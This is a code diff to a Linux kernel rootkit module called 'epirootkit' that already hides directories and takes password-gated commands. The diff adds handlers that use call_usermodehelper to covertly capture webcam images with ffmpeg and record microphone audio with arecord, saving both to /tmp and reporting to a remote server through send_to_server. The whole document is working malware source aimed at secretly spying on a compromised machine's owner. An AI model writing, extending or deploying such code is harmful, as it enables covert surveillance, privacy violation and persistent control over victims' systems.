@@ -6,6 +6,7 @@
 #include <linux/net.h>
 #include <linux/socket.h>
 #include <linux/string.h>
+#include <linux/kmod.h>
 
 #include "epirootkit.h"
 
@@ -45,7 +46,10 @@ int hide_dir_handler(char *args);
 int show_dir_handler(char *args);
 int list_dir_handler(char *args);
 int help_handler(char *args);
-int rootkit_command(char *command, unsigned command_size);
+int start_webcam_handler(char *args);
+int capture_image_handler(char *args);
+int start_microphone_handler(char *args);
+int play_audio_handler(char *args);
 
 static struct command rootkit_commands_array[] = {
     { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 50, connect_handler },
@@ -62,8 +66,14 @@ static struct command rootkit_commands_array[] = {
     { "show_dir", 8, "unhide a directory from the kernel", 36, show_dir_handler },
     { "list_dir", 8, "list hidden directories", 24, list_dir_handler },
     { "help", 4, "display this help message", 30, help_handler },
+    { "start_webcam", 11, "activate webcam", 20, start_webcam_handler },
+    { "capture_image", 13, "capture an image with the webcam", 50, capture_image_handler },
+    { "start_microphone", 15, "start recording from microphone", 40, start_microphone_handler },
+    { "play_audio", 10, "play an audio file", 40, play_audio_handler },
     { NULL, 0, NULL, 0, NULL }
 };
+
+// Handler definitions
 
 int help_handler(char *args) {
     int i;
@@ -309,4 +319,64 @@ int list_dir_handler(char *args)
 
     kfree(buf);
     return 0;
+}
+
+// Commande pour démarrer la webcam et capturer une image
+int start_webcam_handler(char *args)
+{
+    static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
+    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+
+    int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+    if (ret_code < 0) {
+        ERR_MSG("start_webcam_handler: failed to start webcam\n");
+        return ret_code;
+    }
+    send_to_server("Webcam activated and image captured\n");
+    return SUCCESS;
+}
+
+// Commande pour capturer une image de la webcam
+int capture_image_handler(char *args)
+{
+    static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
+    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+
+    int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+    if (ret_code < 0) {
+        ERR_MSG("capture_image_handler: failed to capture image\n");
+        return ret_code;
+    }
+    send_to_server("Captured image saved at /tmp/capture.jpg\n");
+    return SUCCESS;
+}
+
+// Commande pour démarrer l'enregistrement du microphone
+int start_microphone_handler(char *args)
+{
+    static char *argv[] = { "/usr/bin/arecord", "-D", "plughw:1,0", "-f", "cd", "-t", "wav", "-d", "10", "/tmp/audio.wav", NULL };
+    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+
+    int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+    if (ret_code < 0) {
+        ERR_MSG("start_microphone_handler: failed to start microphone\n");
+        return ret_code;
+    }
+    send_to_server("Microphone activated and audio recorded\n");
+    return SUCCESS;
+}
+
+// Commande pour jouer un fichier audio
+int play_audio_handler(char *args)
+{
+    static char *argv[] = { "/usr/bin/aplay", "/tmp/audio.wav", NULL };
+    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+
+    int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+    if (ret_code < 0) {
+        ERR_MSG("play_audio_handler: failed to play audio\n");
+        return ret_code;
+    }
+    send_to_server("Audio played\n");
+    return SUCCESS;
 }
